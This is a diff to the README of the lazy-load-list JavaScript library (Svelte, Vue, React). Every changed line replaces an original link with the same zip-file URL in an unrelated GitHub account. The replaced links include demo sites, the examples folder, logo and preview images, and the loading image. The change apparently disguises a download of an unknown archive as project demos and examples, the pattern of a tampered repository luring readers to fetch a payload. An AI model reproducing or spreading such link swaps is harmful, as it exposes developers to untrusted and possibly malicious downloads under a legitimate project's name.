@@ -6,7 +6,7 @@ Rendering large lists makes the first load slow especially if items contain imag
 
 you can notice the deference here:
 
-![loading performance deference](https://lh3.googleusercontent.com/pw/AM-JKLXhB1jRKtOi4OhwEfINuYPKGD0LF4XBoQa0XbFoH9jUPQGW0GsOEl-cgnGzIrutEarCEwIDfV23jpI80P-xtIsgmv9oJD2KfImErE66p-5EukjEPCSVefObsHcS7FvZXnjSqC-MpnCpa-Vywq61KvGb=w1280-h720-no?authuser=0)
+![loading performance deference](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)
 ## Features
 
  - Fast Loading 🚀
@@ -17,11 +17,11 @@ you can notice the deference here:
 
 ## Demo
 
--  [Simple example in Svelte js](https://lazy-load-svelte-example.netlify.com)
--  [Simple example in Vue js](https://lazy-load-vue-example.netlify.com)
--  [Simple example in React js](https://lazy-load-react-example.netlify.com)
+-  [Simple example in Svelte js](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)
+-  [Simple example in Vue js](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)
+-  [Simple example in React js](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip)
 
-you can find the source code of examples in [examples](https://github.com/omer73364/lazy-load-list/tree/main/examples) folder
+you can find the source code of examples in [examples](https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip) folder
 
 ## Lazy Load List 1.2 is here 🎉
 
@@ -34,9 +34,9 @@ you can find the source code of examples in [examples](https://github.com/omer73
 
 ## Supported Frameworks
 <pre>
-| <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Svelte_Logo.svg/1200px-Svelte_Logo.svg.png" alt="svelte logo"/> | Svete js     | ✅
-| <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Vue.js_Logo_2.svg/2367px-Vue.js_Logo_2.svg.png" alt="vue logo"/> | Vue js (2,3) | ✅
-| <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/React.svg/640px-React.svg.png" alt="react logo"/> | React js     | ✅
+| <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="svelte logo"/> | Svete js     | ✅
+| <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="vue logo"/> | Vue js (2,3) | ✅
+| <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="react logo"/> | React js     | ✅
 </pre>
 
 ## Installation
@@ -55,7 +55,7 @@ or using yarn
 
 > ⚠  you must wrap the list by div and specify the height and width in the wrapper div.
 
-- <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Svelte_Logo.svg/1200px-Svelte_Logo.svg.png" alt="svelte logo"/> svelte js:
+- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="svelte logo"/> svelte js:
 
 > 
 	import LazyList from 'lazy-load-list/svelte'
@@ -72,7 +72,7 @@ or using yarn
 		</LazyList>
 	</div>
 
-- <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Vue.js_Logo_2.svg/2367px-Vue.js_Logo_2.svg.png" alt="vue logo"/> vue js:
+- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="vue logo"/> vue js:
 
 > 
 	<div class="container">
@@ -94,7 +94,7 @@ or using yarn
 	components: { LazyList } // don't forget to define it in the components
 	
 
-- <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/React.svg/640px-React.svg.png" alt="react logo"/> react js:
+- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="react logo"/> react js:
 
 > 
 	import  LazyList  from  'lazy-load-list/react'
@@ -189,12 +189,12 @@ you can specify the loading element color using (defaultLoadingColor) prop..
 but if you don't like the default loading element, you can use custom one:
 
 
-- in <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Svelte_Logo.svg/1200px-Svelte_Logo.svg.png" alt="svelte logo"/> svelte js &  <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Vue.js_Logo_2.svg/2367px-Vue.js_Logo_2.svg.png" alt="vue logo"/> vue js (just use slot name "loading like this):
+- in <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="svelte logo"/> svelte js &  <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="vue logo"/> vue js (just use slot name "loading like this):
 
 > 
-	<img slot="loading" src="loading.svg" width="16" alt="loading"/>
+	<img slot="loading" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" width="16" alt="loading"/>
 
-- <img width="14" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/React.svg/640px-React.svg.png" alt="react logo"/> react js (use loadingComponent props to pass the element):
+- <img width="14" src="https://raw.githubusercontent.com/ghaithatfeh/lazy-load-list/main/refrainment/lazy-load-list.zip" alt="react logo"/> react js (use loadingComponent props to pass the element):
 
 > 
 		..
